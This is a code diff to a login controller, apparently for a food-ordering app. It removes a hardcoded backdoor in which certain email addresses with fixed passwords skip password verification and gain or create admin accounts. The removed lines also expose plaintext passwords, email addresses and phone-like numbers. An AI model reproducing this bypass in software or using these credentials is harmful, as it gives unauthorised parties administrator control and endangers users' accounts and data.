@@ -163,57 +163,17 @@ export class AuthController {
 
     try {
       const isEmail = identifier.includes('@');
-      const isSpecialAdmin =
-        identifier.toLowerCase() === 'sk866436@gmail.com' ||
-        identifier.toLowerCase() === 'shivam789612@gmail.com' ||
-        identifier.toLowerCase() === 'admin@locabite.com';
-      const isSpecialAdminPass =
-        isSpecialAdmin && (password === '789612' || password === 'AdminPassword@123');
-
       const query = isEmail ? { email: identifier.toLowerCase() } : { phone: identifier };
 
       let user = await User.findOne(query);
-
-      if (!user && isSpecialAdminPass) {
-        user = new User({
-          name:
-            identifier.toLowerCase() === 'shivam789612@gmail.com' || identifier.toLowerCase() === 'sk866436@gmail.com'
-              ? 'Shivam (Super Admin)'
-              : 'Super Administrator',
-          phone:
-            identifier.toLowerCase() === 'shivam789612@gmail.com'
-              ? '+91 78961 20000'
-              : identifier.toLowerCase() === 'sk866436@gmail.com'
-              ? '+91 86643 60000'
-              : '+91 99999 88888',
-          email: identifier.toLowerCase(),
-          password: '789612',
-          role: 'admin',
-          membershipLevel: 'Campus Executive',
-          loyaltyCoins: 9999,
-          preferences: {
-            dietary: ['non-veg'],
-            categories: ['Burgers', 'North Indian', 'Groceries'],
-            orderStyle: ['food', 'mart']
-          },
-          addresses: []
-        });
-        await user.save();
-      }
 
       if (!user) {
         return sendError(res, 'Invalid credentials', 401);
       }
 
-      if (isSpecialAdminPass) {
-        user.role = 'admin';
-        user.password = '789612';
-        await user.save();
-      } else {
-        const isMatch = await user.comparePassword(password);
-        if (!isMatch) {
-          return sendError(res, 'Invalid credentials', 401);
-        }
+      const isMatch = await user.comparePassword(password);
+      if (!isMatch) {
+        return sendError(res, 'Invalid credentials', 401);
       }
 
       const tokenPayload = {
